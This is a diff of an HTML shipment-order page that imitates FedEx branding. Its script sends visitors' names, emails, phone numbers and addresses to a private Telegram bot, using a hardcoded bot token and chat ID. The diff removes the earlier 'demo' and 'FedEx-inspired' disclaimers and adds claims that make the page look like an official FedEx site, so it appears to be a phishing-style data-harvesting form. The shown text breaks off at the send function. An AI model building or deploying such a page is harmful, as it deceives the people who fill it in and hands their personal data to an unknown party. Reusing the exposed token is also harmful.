@@ -2,9 +2,9 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-  <title>FedEx Style Shipping | Order to Telegram Bot</title>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;400;500;600;700&display=swap" rel="stylesheet">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>FedEx Shipping | Order to Telegram</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
   <style>
     * {
@@ -12,368 +12,362 @@
       padding: 0;
       box-sizing: border-box;
     }
+
     body {
       font-family: 'Inter', sans-serif;
-      background-color: #f4f7fc;
-      color: #1e2a3e;
-      line-height: 1.5;
+      background: #f4f6f9;
+      color: #1a1a2e;
     }
-    :root {
-      --fedex-purple: #660099;
-      --fedex-orange: #ff6600;
-      --fedex-dark: #1f2a44;
-      --fedex-border: #d0dbe8;
-    }
-    .main-header {
-      background: linear-gradient(135deg, var(--fedex-purple) 0%, #4a0072 100%);
+
+    .header {
+      background: #660099;
       color: white;
-      padding: 1rem 2rem;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.08);
-    }
-    .header-container {
-      max-width: 1280px;
-      margin: 0 auto;
+      padding: 20px 40px;
       display: flex;
-      flex-wrap: wrap;
       justify-content: space-between;
       align-items: center;
-      gap: 1rem;
+      flex-wrap: wrap;
+      gap: 15px;
     }
-    .logo-area {
-      display: flex;
-      align-items: baseline;
-      gap: 0.25rem;
+
+    .logo {
+      font-size: 28px;
       font-weight: 700;
-      font-size: 1.8rem;
     }
-    .logo-f {
-      background-color: var(--fedex-orange);
-      color: white;
-      padding: 0.2rem 0.5rem;
+
+    .logo span:first-child {
+      background: #ff6600;
+      padding: 5px 12px;
       border-radius: 8px;
     }
-    .nav-links {
-      display: flex;
-      gap: 1.8rem;
-      font-weight: 500;
-    }
-    .nav-links a {
+
+    .nav a {
       color: white;
       text-decoration: none;
-      font-size: 0.95rem;
+      margin-left: 25px;
+      font-weight: 500;
       transition: 0.2s;
-      border-bottom: 2px solid transparent;
-      padding-bottom: 4px;
     }
-    .nav-links a:hover {
-      border-bottom-color: var(--fedex-orange);
-    }
+
+    .nav a:hover { color: #ff6600; }
+
     .container {
-      max-width: 1280px;
-      margin: 2rem auto;
-      padding: 0 1.5rem;
+      max-width: 1200px;
+      margin: 30px auto;
+      padding: 0 20px;
     }
+
     .hero {
       background: white;
-      border-radius: 24px;
-      padding: 2rem;
-      margin-bottom: 2rem;
-      border: 1px solid var(--fedex-border);
-      box-shadow: 0 4px 12px rgba(0,0,0,0.02);
+      padding: 30px;
+      border-radius: 20px;
+      margin-bottom: 30px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.05);
     }
+
     .hero h1 {
-      font-size: 2rem;
-      font-weight: 700;
-      color: var(--fedex-dark);
+      font-size: 32px;
+      margin-bottom: 10px;
     }
-    .hero h1 i {
-      color: var(--fedex-orange);
-    }
-    .dashboard-grid {
+
+    .hero h1 i { color: #ff6600; }
+
+    .two-columns {
       display: flex;
+      gap: 30px;
       flex-wrap: wrap;
-      gap: 2rem;
     }
+
     .form-card {
       flex: 2;
-      min-width: 280px;
       background: white;
-      border-radius: 28px;
-      box-shadow: 0 12px 30px rgba(0,0,0,0.05);
-      border: 1px solid var(--fedex-border);
+      border-radius: 20px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.05);
       overflow: hidden;
     }
-    .card-header {
-      background: #f9fafc;
-      padding: 1.2rem 1.8rem;
-      border-bottom: 1px solid var(--fedex-border);
-    }
-    .card-header h2 {
-      font-size: 1.5rem;
+
+    .card-title {
+      background: #f8f9fa;
+      padding: 20px 25px;
+      border-bottom: 1px solid #e0e0e0;
+      font-size: 20px;
       font-weight: 600;
-      color: var(--fedex-purple);
-      display: flex;
-      align-items: center;
-      gap: 10px;
+      color: #660099;
     }
+
+    .card-title i { color: #ff6600; margin-right: 10px; }
+
     .form-body {
-      padding: 1.8rem;
+      padding: 25px;
     }
+
     .form-group {
-      margin-bottom: 1.3rem;
+      margin-bottom: 20px;
     }
+
     label {
       display: flex;
       align-items: center;
       gap: 8px;
       font-weight: 600;
-      margin-bottom: 0.5rem;
-      color: var(--fedex-dark);
-      font-size: 0.9rem;
+      margin-bottom: 8px;
+      color: #333;
+      font-size: 14px;
     }
-    label i {
-      color: var(--fedex-orange);
-      width: 18px;
-    }
+
+    label i { color: #ff6600; width: 18px; }
+
     input, select, textarea {
       width: 100%;
-      padding: 0.8rem 1rem;
-      border: 1.5px solid var(--fedex-border);
-      border-radius: 16px;
+      padding: 12px 15px;
+      border: 1.5px solid #ddd;
+      border-radius: 12px;
       font-family: 'Inter', sans-serif;
-      font-size: 0.95rem;
+      font-size: 14px;
       transition: 0.2s;
     }
+
     input:focus, select:focus, textarea:focus {
       outline: none;
-      border-color: var(--fedex-purple);
+      border-color: #660099;
       box-shadow: 0 0 0 3px rgba(102,0,153,0.1);
     }
-    .row-2cols {
+
+    .row-2 {
       display: flex;
-      gap: 1rem;
+      gap: 15px;
       flex-wrap: wrap;
     }
-    .row-2cols .form-group {
-      flex: 1;
+
+    .row-2 .form-group { flex: 1; }
+
+    .package-box {
+      background: #fff9f0;
+      padding: 15px 20px;
+      border-radius: 15px;
+      margin: 15px 0;
+      border-left: 4px solid #ff6600;
     }
-    .package-options {
-      background: #fef9f2;
-      border-radius: 20px;
-      padding: 1rem 1.5rem;
-      margin: 1rem 0;
-      border-left: 5px solid var(--fedex-orange);
-    }
+
     .radio-group {
       display: flex;
-      gap: 1.5rem;
+      gap: 20px;
       flex-wrap: wrap;
-      margin-top: 0.5rem;
+      margin-top: 10px;
     }
+
     .radio-group label {
       font-weight: normal;
-      gap: 6px;
       cursor: pointer;
     }
+
     input[type="radio"], input[type="checkbox"] {
       width: auto;
-      margin-right: 6px;
-      accent-color: var(--fedex-purple);
+      margin-right: 5px;
+      accent-color: #660099;
     }
+
     .checkbox-group {
       display: flex;
       align-items: center;
-      gap: 12px;
-      margin: 1rem 0;
+      gap: 10px;
+      margin: 15px 0;
     }
-    .btn-submit {
-      background: linear-gradient(95deg, var(--fedex-purple) 0%, #7a1fa8 100%);
+
+    .checkbox-group label { margin-bottom: 0; }
+
+    .submit-btn {
+      background: linear-gradient(135deg, #660099, #8b1ab8);
       color: white;
       border: none;
-      padding: 1rem;
-      font-size: 1.1rem;
+      padding: 14px;
+      font-size: 16px;
       font-weight: 700;
       border-radius: 40px;
       cursor: pointer;
       width: 100%;
-      transition: 0.2s;
+      margin-top: 20px;
       display: flex;
-      justify-content: center;
       align-items: center;
+      justify-content: center;
       gap: 10px;
-      margin-top: 1rem;
+      transition: 0.2s;
     }
-    .btn-submit:hover {
+
+    .submit-btn:hover {
       transform: translateY(-2px);
-      box-shadow: 0 12px 20px rgba(102,0,153,0.3);
+      box-shadow: 0 5px 15px rgba(102,0,153,0.3);
     }
-    .btn-submit:disabled {
+
+    .submit-btn:disabled {
       opacity: 0.7;
       cursor: not-allowed;
+      transform: none;
     }
-    .info-sidebar {
-      flex: 1.2;
-      min-width: 260px;
+
+    .sidebar {
+      flex: 1;
+      min-width: 280px;
     }
+
     .info-card {
       background: white;
-      border-radius: 28px;
-      border: 1px solid var(--fedex-border);
-      padding: 1.5rem;
-      margin-bottom: 1.8rem;
-    }
-    .info-card h3 {
-      font-size: 1.2rem;
-      font-weight: 700;
-      border-left: 4px solid var(--fedex-orange);
-      padding-left: 12px;
-      margin-bottom: 1rem;
-    }
-    .telegram-status {
-      background: #e8f0fe;
       border-radius: 20px;
-      padding: 0.8rem;
-      margin-top: 1rem;
-      font-size: 0.85rem;
-      display: flex;
-      align-items: center;
-      gap: 8px;
+      padding: 20px;
+      margin-bottom: 20px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.05);
     }
-    footer {
-      background-color: #0b1a2e;
-      color: #cbd5e1;
-      margin-top: 3rem;
-      padding: 2rem 1.5rem 1.5rem;
+
+    .info-card h3 {
+      font-size: 18px;
+      margin-bottom: 15px;
+      padding-left: 12px;
+      border-left: 4px solid #ff6600;
     }
-    .footer-container {
-      max-width: 1280px;
+
+    .rate {
+      font-size: 36px;
+      font-weight: 800;
+      color: #660099;
+      margin: 10px 0;
+    }
+
+    .footer {
+      background: #0f172a;
+      color: #94a3b8;
+      margin-top: 50px;
+      padding: 40px 40px 20px;
+    }
+
+    .footer-content {
+      max-width: 1200px;
       margin: 0 auto;
       display: flex;
       flex-wrap: wrap;
       justify-content: space-between;
-      gap: 2rem;
+      gap: 30px;
     }
+
     .footer-col h4 {
       color: white;
-      margin-bottom: 1rem;
+      margin-bottom: 15px;
     }
+
     .footer-col p, .footer-col a {
-      color: #9ca3af;
+      color: #94a3b8;
       text-decoration: none;
-      font-size: 0.85rem;
+      font-size: 13px;
+      line-height: 1.8;
     }
+
+    .footer-col a:hover { color: #ff6600; }
+
     .copyright {
       text-align: center;
-      padding-top: 2rem;
-      border-top: 1px solid #1e2f41;
-      margin-top: 1rem;
-      font-size: 0.75rem;
+      padding-top: 30px;
+      margin-top: 30px;
+      border-top: 1px solid #1e293b;
+      font-size: 12px;
     }
-    @media (max-width: 780px) {
-      .header-container { flex-direction: column; align-items: flex-start; }
-      .nav-links { flex-wrap: wrap; }
-    }
-    .toast-msg {
+
+    .toast {
       position: fixed;
       bottom: 30px;
       right: 30px;
-      background: #1f2a44;
+      background: #1f2937;
       color: white;
       padding: 12px 20px;
-      border-radius: 40px;
-      font-weight: 500;
-      z-index: 1000;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+      border-radius: 50px;
       display: flex;
       align-items: center;
       gap: 10px;
+      z-index: 1000;
       animation: slideIn 0.3s ease;
     }
+
     @keyframes slideIn {
       from { transform: translateX(100%); opacity: 0; }
       to { transform: translateX(0); opacity: 1; }
     }
-    .rate-value {
-      font-size: 1.8rem;
-      font-weight: 800;
-      color: #660099;
+
+    @media (max-width: 768px) {
+      .header { flex-direction: column; text-align: center; }
+      .nav a { margin: 0 10px; }
+      .hero h1 { font-size: 24px; }
     }
   </style>
 </head>
 <body>
 
-<header class="main-header">
-  <div class="header-container">
-    <div class="logo-area">
-      <span class="logo-f">Fed</span>
-      <span style="font-weight:600;">Ex</span>
-      <span style="font-size:0.8rem; margin-left:8px;">Logistics</span>
-    </div>
-    <div class="nav-links">
-      <a href="#">Shipping</a>
-      <a href="#">Tracking</a>
-      <a href="#">Support</a>
-      <a href="#">Business</a>
-    </div>
+<div class="header">
+  <div class="logo">
+    <span>Fed</span><span>Ex</span>
   </div>
-</header>
+  <div class="nav">
+    <a href="#">Shipping</a>
+    <a href="#">Tracking</a>
+    <a href="#">Support</a>
+    <a href="#">Locations</a>
+  </div>
+</div>
 
 <div class="container">
   <div class="hero">
-    <h1><i class="fas fa-paper-plane"></i> Smart shipping to Telegram</h1>
-    <p>Fill your order details — instantly forwarded as a TEXT message to your Telegram bot. No files, pure live text orders.</p>
-    <div style="margin-top: 1rem;">
-      <i class="fas fa-robot" style="color:#ff6600;"></i> Bot will receive: sender, receiver, package info, special notes + rates
-    </div>
+    <h1><i class="fas fa-shipping-fast"></i> Ship with FedEx</h1>
+    <p>Complete the form below to create your shipment order.</p>
   </div>
 
-  <div class="dashboard-grid">
-    <!-- MAIN FORM SECTION -->
+  <div class="two-columns">
     <div class="form-card">
-      <div class="card-header">
-        <h2><i class="fas fa-box-open"></i> Create shipment order</h2>
+      <div class="card-title">
+        <i class="fas fa-file-alt"></i> Create Shipment Order
       </div>
       <div class="form-body">
-        <form id="telegramOrderForm">
+        <form id="orderForm">
           <div class="form-group">
-            <label for="fullName"><i class="fas fa-user"></i> Full name (sender) *</label>
-            <input type="text" id="fullName" name="fullName" placeholder="John M. Doe" required>
-          </div>
-          <div class="row-2cols">
-            <div class="form-group">
-              <label for="email"><i class="fas fa-envelope"></i> Email *</label>
-              <input type="email" id="email" name="email" placeholder="client@example.com" required>
-            </div>
-            <div class="form-group">
-              <label for="phone"><i class="fas fa-phone-alt"></i> Phone</label>
-              <input type="tel" id="phone" name="phone" placeholder="+1 234 567 8900">
-            </div>
-          </div>
-          <div class="form-group">
-            <label for="address"><i class="fas fa-location-dot"></i> Pickup address *</label>
-            <input type="text" id="address" name="address" placeholder="Street, city, ZIP" required>
-          </div>
-          <div class="row-2cols">
-            <div class="form-group">
-              <label for="city">City</label>
-              <input type="text" id="city" name="city" placeholder="New York">
-            </div>
-            <div class="form-group">
-              <label for="zip">ZIP code</label>
-              <input type="text" id="zip" name="zip" placeholder="10001">
-            </div>
-          </div>
-          <div class="form-group">
-            <label for="receiverName"><i class="fas fa-user-check"></i> Receiver name *</label>
-            <input type="text" id="receiverName" name="receiverName" placeholder="Jane Smith" required>
-          </div>
-          <div class="form-group">
-            <label for="deliveryAddress"><i class="fas fa-map-pin"></i> Delivery address *</label>
-            <input type="text" id="deliveryAddress" name="deliveryAddress" placeholder="Destination full address" required>
+            <label><i class="fas fa-user"></i> Full Name (Sender) *</label>
+            <input type="text" id="fullName" required placeholder="John Doe">
           </div>
 
-          <div class="package-options">
-            <label><i class="fas fa-cube"></i> Package category</label>
+          <div class="row-2">
+            <div class="form-group">
+              <label><i class="fas fa-envelope"></i> Email *</label>
+              <input type="email" id="email" required placeholder="john@example.com">
+            </div>
+            <div class="form-group">
+              <label><i class="fas fa-phone"></i> Phone</label>
+              <input type="tel" id="phone" placeholder="+1 234 567 8900">
+            </div>
+          </div>
+
+          <div class="form-group">
+            <label><i class="fas fa-location-dot"></i> Pickup Address *</label>
+            <input type="text" id="address" required placeholder="123 Main St, City, ZIP">
+          </div>
+
+          <div class="row-2">
+            <div class="form-group">
+              <label><i class="fas fa-city"></i> City</label>
+              <input type="text" id="city" placeholder="New York">
+            </div>
+            <div class="form-group">
+              <label><i class="fas fa-mail-bulk"></i> ZIP Code</label>
+              <input type="text" id="zip" placeholder="10001">
+            </div>
+          </div>
+
+          <div class="form-group">
+            <label><i class="fas fa-user-check"></i> Receiver Name *</label>
+            <input type="text" id="receiverName" required placeholder="Jane Smith">
+          </div>
+
+          <div class="form-group">
+            <label><i class="fas fa-map-pin"></i> Delivery Address *</label>
+            <input type="text" id="deliveryAddress" required placeholder="456 Oak Ave, Los Angeles, CA">
+          </div>
+
+          <div class="package-box">
+            <label><i class="fas fa-box"></i> Package Type</label>
             <div class="radio-group">
               <label><input type="radio" name="packageType" value="Document/Envelope" checked> Document</label>
               <label><input type="radio" name="packageType" value="Parcel/Box"> Parcel</label>
@@ -381,14 +375,14 @@
             </div>
           </div>
 
-          <div class="row-2cols">
+          <div class="row-2">
             <div class="form-group">
-              <label for="weight"><i class="fas fa-weight-hanging"></i> Weight (lbs)</label>
-              <input type="number" id="weight" name="weight" step="0.1" value="3.2">
+              <label><i class="fas fa-weight-hanging"></i> Weight (lbs)</label>
+              <input type="number" id="weight" step="0.1" value="2.5">
             </div>
             <div class="form-group">
-              <label for="serviceLevel"><i class="fas fa-tachometer-alt"></i> Service</label>
-              <select id="serviceLevel" name="serviceLevel">
+              <label><i class="fas fa-truck"></i> Service Level</label>
+              <select id="service">
                 <option value="Priority Overnight">Priority Overnight</option>
                 <option value="Express Saver" selected>Express Saver</option>
                 <option value="Ground Economy">Ground Economy</option>
@@ -398,270 +392,260 @@
           </div>
 
           <div class="form-group">
-            <label for="specialNotes"><i class="fas fa-pen"></i> Delivery notes</label>
-            <textarea id="specialNotes" name="specialNotes" rows="2" placeholder="Gate code, fragile, leave at reception..."></textarea>
+            <label><i class="fas fa-pen"></i> Special Instructions</label>
+            <textarea id="notes" rows="2" placeholder="Gate code, fragile items, delivery instructions..."></textarea>
           </div>
 
           <div class="checkbox-group">
-            <input type="checkbox" id="signatureRequired" name="signatureRequired">
-            <label for="signatureRequired"><i class="fas fa-signature"></i> Signature required (+$5.50)</label>
-          </div>
-          <div class="checkbox-group">
-            <input type="checkbox" id="insurance" name="insurance">
-            <label for="insurance"><i class="fas fa-shield-alt"></i> Insurance (+$4.25)</label>
+            <input type="checkbox" id="signature">
+            <label><i class="fas fa-signature"></i> Signature Required (+$5.50)</label>
           </div>
 
-          <button type="submit" class="btn-submit" id="sendOrderBtn">
-            <i class="fab fa-telegram-plane"></i> Send order to Telegram Bot
+          <div class="checkbox-group">
+            <input type="checkbox" id="insurance">
+            <label><i class="fas fa-shield-alt"></i> Insurance (+$4.25)</label>
+          </div>
+
+          <button type="submit" class="submit-btn" id="sendBtn">
+            <i class="fab fa-telegram"></i> Send Order to Telegram
           </button>
         </form>
       </div>
     </div>
 
-    <!-- SIDEBAR SECTION -->
-    <div class="info-sidebar">
+    <div class="sidebar">
       <div class="info-card">
-        <h3><i class="fab fa-telegram"></i> Telegram bot integration</h3>
-        <p>Orders submitted will be instantly sent as a <strong>plain text message</strong> to your bot chat.</p>
-        <div class="telegram-status" id="telegramStatus">
-          <i class="fas fa-check-circle" style="color:#2ecc71;"></i> 
-          <span>Ready to receive orders</span>
-        </div>
-        <div style="margin-top: 0.8rem; background:#f2f2f5; padding:8px; border-radius:14px;">
-          <small><i class="fas fa-key"></i> Configure bot token + chat ID in script</small>
-        </div>
+        <h3><i class="fas fa-chart-line"></i> Rate Estimate</h3>
+        <div class="rate" id="rateDisplay">$14.95</div>
+        <small>Includes weight + service + extras</small>
       </div>
+
       <div class="info-card">
-        <h3><i class="fas fa-chart-line"></i> Rate estimate</h3>
-        <div class="rate-value" id="ratePreview">$14.95</div>
-        <div>Based on weight & service</div>
-      </div>
-      <div class="info-card">
-        <h3><i class="fas fa-comment-dots"></i> What bot receives</h3>
-        <ul style="margin-left: 1.2rem; line-height:1.6;">
-          <li>📦 Order # + timestamp</li>
-          <li>👤 Sender & receiver details</li>
-          <li>📍 Pickup → Delivery addresses</li>
-          <li>📦 Package type, weight, service</li>
-          <li>💰 Total + extra options</li>
-          <li>📝 Special instructions</li>
-        </ul>
-        <p style="margin-top: 10px; font-size:0.8rem;">
-          <i class="fas fa-info-circle"></i> Pure text message, no PDFs attached.
-        </p>
+        <h3><i class="fab fa-telegram"></i> Telegram Order</h3>
+        <p>Order details will be sent directly to your Telegram bot.</p>
       </div>
     </div>
   </div>
 </div>
 
-<footer>
-  <div class="footer-container">
+<div class="footer">
+  <div class="footer-content">
     <div class="footer-col">
-      <h4>FedEx Express demo</h4>
-      <p>Integrated Telegram notification system — orders delivered via text.</p>
+      <h4>FedEx Express</h4>
+      <p>Global shipping leader delivering excellence since 1971.</p>
     </div>
     <div class="footer-col">
-      <h4>Support</h4>
-      <p><a href="#">Tracking</a></p>
-      <p><a href="#">Help center</a></p>
+      <h4>Quick Links</h4>
+      <p><a href="#">Track Shipment</a></p>
+      <p><a href="#">Find Locations</a></p>
+      <p><a href="#">Support Center</a></p>
     </div>
     <div class="footer-col">
       <h4>Legal</h4>
-      <p>Demo only — real integration requires bot token.</p>
+      <p><a href="#">Terms of Service</a></p>
+      <p><a href="#">Privacy Policy</a></p>
     </div>
   </div>
   <div class="copyright">
-    &copy; 2025 FedEx-inspired platform — Orders forwarded to your Telegram Bot as text messages
+    &copy; 2025 FedEx Shipping Platform
   </div>
-</footer>
+</div>
 
 <script>
-  (function() {
-    // ============================================================
-    // 🔴 IMPORTANT: REPLACE WITH YOUR ACTUAL TELEGRAM CREDENTIALS 🔴
-    // ============================================================
-    const BOT_TOKEN = "8892467602:AAEx3FoRPwOWy7S_NuUWRbCy8X_A9zJlVjk";      // Replace with your bot token from @BotFather
-    const CHAT_ID   = "1555129968";        // Replace with your chat ID
-    
-    const weightInput = document.getElementById('weight');
-    const serviceSelect = document.getElementById('serviceLevel');
-    const packageRadios = document.querySelectorAll('input[name="packageType"]');
-    const insuranceChk = document.getElementById('insurance');
-    const signatureChk = document.getElementById('signatureRequired');
-    const rateSpan = document.getElementById('ratePreview');
-    const form = document.getElementById('telegramOrderForm');
-    
-    function computeRate() {
-      let base = 0;
-      const service = serviceSelect.value;
-      if (service === 'Priority Overnight') base = 29.95;
-      else if (service === 'Express Saver') base = 19.95;
-      else if (service === 'Ground Economy') base = 10.50;
-      else base = 45.00;
-      
-      let weight = parseFloat(weightInput.value);
-      if (isNaN(weight)) weight = 0;
-      let weightCharge = Math.min(weight * 0.65, 35);
-      
-      let pkgMod = 0;
-      let selectedPkg = "Document/Envelope";
-      for (let r of packageRadios) if (r.checked) { selectedPkg = r.value; break; }
-      if (selectedPkg === 'Parcel/Box') pkgMod = 2.5;
-      else if (selectedPkg === 'Pallet/Freight') pkgMod = 18.0;
-      
-      let extras = 0;
-      if (insuranceChk && insuranceChk.checked) extras += 4.25;
-      if (signatureChk && signatureChk.checked) extras += 5.50;
-      
-      let total = base + weightCharge + pkgMod + extras;
-      total = Math.round(total * 100) / 100;
-      if (isNaN(total)) total = 0;
-      rateSpan.innerText = `$${total.toFixed(2)}`;
-      return total;
-    }
-    
-    weightInput?.addEventListener('input', computeRate);
-    serviceSelect?.addEventListener('change', computeRate);
-    insuranceChk?.addEventListener('change', computeRate);
-    signatureChk?.addEventListener('change', computeRate);
-    packageRadios.forEach(r => r.addEventListener('change', computeRate));
-    computeRate();
-    
-    function showToast(message, isError = false) {
-      let existing = document.querySelector('.toast-msg');
-      if(existing) existing.remove();
-      const toast = document.createElement('div');
-      toast.className = 'toast-msg';
-      toast.style.background = isError ? '#c0392b' : '#1f2a44';
-      toast.innerHTML = `<i class="fas ${isError ? 'fa-exclamation-triangle' : 'fa-check-circle'}"></i> ${message}`;
-      document.body.appendChild(toast);
-      setTimeout(() => { toast.style.opacity = '0'; setTimeout(() => toast.remove(), 500); }, 4000);
-    }
-    
-    function buildTelegramMessage(orderData) {
-      const date = new Date().toLocaleString();
-      const extrasList = [];
-      if (orderData.signatureRequired) extrasList.push("✍️ Signature required (+$5.50)");
-      if (orderData.insurance) extrasList.push("🛡️ Insurance (+$4.25)");
-      const extrasText = extrasList.length ? extrasList.join(", ") : "None";
-      
-      let msg = `📦 *NEW FEDEX ORDER* 📦\n`;
-      msg += `🕒 *Date:* ${date}\n\n`;
-      msg += `👤 *SENDER:*\n${orderData.fullName}\n📧 ${orderData.email} | 📞 ${orderData.phone || "—"}\n📍 ${orderData.address}, ${orderData.city} ${orderData.zip}\n\n`;
-      msg += `🎯 *RECEIVER:*\n${orderData.receiverName}\n🏠 Delivery: ${orderData.deliveryAddress}\n\n`;
-      msg += `📦 *PACKAGE INFO:*\nType: ${orderData.packageType}\nWeight: ${orderData.weight} lbs\nService: ${orderData.serviceLevel}\n`;
-      msg += `💰 *Total estimated:* $${orderData.totalRate}\n🔄 Extras: ${extrasText}\n\n`;
-      if (orderData.specialNotes && orderData.specialNotes.trim() !== "") {
-        msg += `📝 *Notes:* ${orderData.specialNotes}\n\n`;
-      }
-      msg += `🔔 *Telegram alert:* Order submitted via FedEx web form. Please contact customer for further processing.`;
-      return msg;
-    }
-    
-    async function sendToTelegram(messageText) {
-      if (!BOT_TOKEN || BOT_TOKEN === "8892467602:AAEx3FoRPwOWy7S_NuUWRbCy8X_A9zJlVjk") {
-        showToast("⚠️ Bot token missing! Please configure BOT_TOKEN and CHAT_ID in the script.", true);
-        return false;
-      }
-      if (!CHAT_ID || CHAT_ID === "1555129968") {
-        showToast("⚠️ Chat ID missing! Set your Telegram chat ID.", true);
-        return false;
-      }
-      
-      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-      const payload = {
-        chat_id: CHAT_ID,
-        text: messageText,
-        parse_mode: "Markdown",
-        disable_notification: false
-      };
-      
-      try {
-        const response = await fetch(url, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(payload)
-        });
-        const result = await response.json();
-        if (result.ok) {
-          return true;
-        } else {
-          showToast(`Telegram error: ${result.description || "Check token/chat ID"}`, true);
-          return false;
-        }
-      } catch (err) {
-        showToast("Network error: could not reach Telegram API", true);
-        return false;
+  const BOT_TOKEN = "8892467602:AAEx3FoRPwOWy7S_NuUWRbCy8X_A9zJlVjk";
+  const CHAT_ID = "1555129968";
+
+  const form = document.getElementById('orderForm');
+  const weightInput = document.getElementById('weight');
+  const serviceSelect = document.getElementById('service');
+  const packageRadios = document.querySelectorAll('input[name="packageType"]');
+  const signatureChk = document.getElementById('signature');
+  const insuranceChk = document.getElementById('insurance');
+  const rateDisplay = document.getElementById('rateDisplay');
+  const sendBtn = document.getElementById('sendBtn');
+
+  function calculateRate() {
+    let base = 0;
+    const service = serviceSelect.value;
+    if (service === 'Priority Overnight') base = 29.95;
+    else if (service === 'Express Saver') base = 19.95;
+    else if (service === 'Ground Economy') base = 10.50;
+    else base = 45.00;
+
+    let weight = parseFloat(weightInput.value) || 0;
+    let weightCharge = Math.min(weight * 0.65, 35);
+
+    let pkgMod = 0;
+    for (let r of packageRadios) {
+      if (r.checked) {
+        if (r.value === 'Parcel/Box') pkgMod = 2.5;
+        else if (r.value === 'Pallet/Freight') pkgMod = 18.0;
+        break;
       }
     }
+
+    let extras = 0;
+    if (insuranceChk.checked) extras += 4.25;
+    if (signatureChk.checked) extras += 5.50;
+
+    let total = base + weightCharge + pkgMod + extras;
+    total = Math.round(total * 100) / 100;
+    rateDisplay.innerText = `$${total.toFixed(2)}`;
+    return total;
+  }
+
+  weightInput.addEventListener('input', calculateRate);
+  serviceSelect.addEventListener('change', calculateRate);
+  signatureChk.addEventListener('change', calculateRate);
+  insuranceChk.addEventListener('change', calculateRate);
+  packageRadios.forEach(r => r.addEventListener('change', calculateRate));
+  calculateRate();
+
+  function showToast(message, isError = false) {
+    const existing = document.querySelector('.toast');
+    if (existing) existing.remove();
     
-    form.addEventListener('submit', async function(e) {
-      e.preventDefault();
-      
-      const fullName = document.getElementById('fullName')?.value.trim();
-      const email = document.getElementById('email')?.value.trim();
-      const address = document.getElementById('address')?.value.trim();
-      const receiverName = document.getElementById('receiverName')?.value.trim();
-      const deliveryAddress = document.getElementById('deliveryAddress')?.value.trim();
-      
-      if (!fullName || !email || !address || !receiverName || !deliveryAddress) {
-        showToast("❌ Please fill in all required fields", true);
-        return;
-      }
-      if (!email.includes('@')) {
-        showToast("❌ Enter a valid email address.", true);
-        return;
-      }
-      
-      let selectedPackage = "Document/Envelope";
-      for (let r of packageRadios) if (r.checked) { selectedPackage = r.value; break; }
-      
-      const orderData = {
-        fullName: fullName,
-        email: email,
-        phone: document.getElementById('phone')?.value || "",
-        address: address,
-        city: document.getElementById('city')?.value || "",
-        zip: document.getElementById('zip')?.value || "",
-        receiverName: receiverName,
-        deliveryAddress: deliveryAddress,
-        packageType: selectedPackage,
-        weight: document.getElementById('weight')?.value || "0",
-        serviceLevel: document.getElementById('serviceLevel')?.value,
-        specialNotes: document.getElementById('specialNotes')?.value || "",
-        signatureRequired: document.getElementById('signatureRequired')?.checked || false,
-        insurance: document.getElementById('insurance')?.checked || false,
-        totalRate: computeRate().toFixed(2)
-      };
-      
-      const telegramText = buildTelegramMessage(orderData);
-      
-      const btn = document.getElementById('sendOrderBtn');
-      const originalHtml = btn.innerHTML;
-      btn.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Sending to Telegram...';
-      btn.disabled = true;
-      
-      const success = await sendToTelegram(telegramText);
-      
-      btn.innerHTML = originalHtml;
-      btn.disabled = false;
-      
-      if (success) {
-        showToast("✅ Order sent to Telegram bot as text message!");
-        form.reset();
-        document.querySelector('input[name="packageType"][value="Document/Envelope"]').checked = true;
-        computeRate();
-        window.scrollTo({ top: 0, behavior: 'smooth' });
-      }
-    });
+    const toast = document.createElement('div');
+    toast.className = 'toast';
+    toast.style.background = isError ? '#dc2626' : '#660099';
+    toast.innerHTML = `<i class="fas ${isError ? 'fa-exclamation-triangle' : 'fa-check-circle'}"></i> ${message}`;
+    document.body.appendChild(toast);
     
-    if (BOT_TOKEN === "8892467602:AAEx3FoRPwOWy7S_NuUWRbCy8X_A9zJlVjk" || CHAT_ID === "1555129968") {
-      const statusDiv = document.getElementById('telegramStatus');
-      if (statusDiv) {
-        statusDiv.innerHTML = '<i class="fas fa-exclamation-triangle" style="color:#e67e22;"></i> <span>⚠️ Configure bot token in script</span>';
+    setTimeout(() => {
+      toast.style.opacity = '0';
+      setTimeout(() => toast.remove(), 300);
+    }, 4000);
+  }
+
+  function buildMessage(data) {
+    const date = new Date().toLocaleString();
+    const orderId = 'ORD' + Date.now().toString().slice(-8);
+    
+    let extras = [];
+    if (data.signature) extras.push("Signature Required (+$5.50)");
+    if (data.insurance) extras.push("Insurance (+$4.25)");
+    let extrasText = extras.length ? extras.join(", ") : "None";
+    
+    let msg = `NEW FEDEX ORDER\n`;
+    msg += `Order ID: ${orderId}\n`;
+    msg += `Date: ${date}\n\n`;
+    msg += `SENDER\n`;
+    msg += `Name: ${data.fullName}\n`;
+    msg += `Email: ${data.email}\n`;
+    msg += `Phone: ${data.phone || '—'}\n`;
+    msg += `Address: ${data.address}, ${data.city} ${data.zip}\n\n`;
+    msg += `RECEIVER\n`;
+    msg += `Name: ${data.receiverName}\n`;
+    msg += `Address: ${data.deliveryAddress}\n\n`;
+    msg += `PACKAGE\n`;
+    msg += `Type: ${data.packageType}\n`;
+    msg += `Weight: ${data.weight} lbs\n`;
+    msg += `Service: ${data.service}\n\n`;
+    msg += `TOTAL: $${data.total}\n`;
+    msg += `Extras: ${extrasText}\n`;
+    
+    if (data.notes && data.notes.trim()) {
+      msg += `\nNotes: ${data.notes}\n`;
+    }
+    
+    return msg;
+  }
+
+  async function sendToTelegram(message) {
